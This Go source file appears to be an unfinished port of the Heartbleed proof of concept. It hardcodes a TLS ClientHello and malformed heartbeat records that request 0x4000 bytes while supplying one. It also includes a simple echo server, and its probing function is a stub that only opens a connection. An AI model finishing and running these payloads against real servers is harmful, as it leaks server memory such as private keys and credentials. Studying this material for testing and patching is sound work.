package Heartbeat

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"strings"
)

func h2bin(str string) []byte {
	// strip ' ' and \n and python decode('hex')
	str = strings.ReplaceAll(str, " ", "")
	str = strings.ReplaceAll(str, "\n", "")
	decoded, err := hex.DecodeString(str)
	if err != nil {
		log.Fatal(err)
	}

	return decoded
}

var hello = h2bin("16 03 02 00  dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00 00 0f 00 01 01")
var hbv10 = h2bin("18 03 01 00 03 01 40 00")
var hbv11 = h2bin("18 03 02 00 03 01 40 00")
var hbv12 = h2bin("18 03 03 00 03 01 40 00")

// echo is a handler function that simply echoes received data.
func echo(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	s, err := reader.ReadString('\n')
	if err != nil {
		log.Fatalln("Unable to read data")
	}
	fmt.Println("Read %d bytes: %s", len(s), s)

	log.Println("Writing data")
	writer := bufio.NewWriter(conn)
	if _, err := writer.WriteString(s); err != nil {
		log.Fatalln("Unable to write data")
	}
	writer.Flush()
}

func Server() {
	// Bind to TCP port 20080 on all interfaces.
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}
	log.Println("Listening on 0.0.0.0:20080")
	for {
		// Wait for connection. Create net.Conn on connection established.
		conn, err := listener.Accept()
		log.Println("Received connection")
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		// Handle the connection. Using goroutine for concurrency.
		{
			go echo(conn)
		}
	}
}

func Heartbleed(address string, port string) {
	// get options, for now hardcoded
	address = address + ":" + port
	check(address)
}

func check(address string) {
	//
	fmt.Println(address)
	//create socket with connect()
	conn, err := net.Dial("tcp", address)

	if err != nil {
		log.Fatalln(err)
	}

	defer conn.Close()
	// tls(s, quiet)

	version := parseResp()
	fmt.Println(version)
}

func parseResp() string {
	fmt.Println("Parse resp")
	return ":)"
}
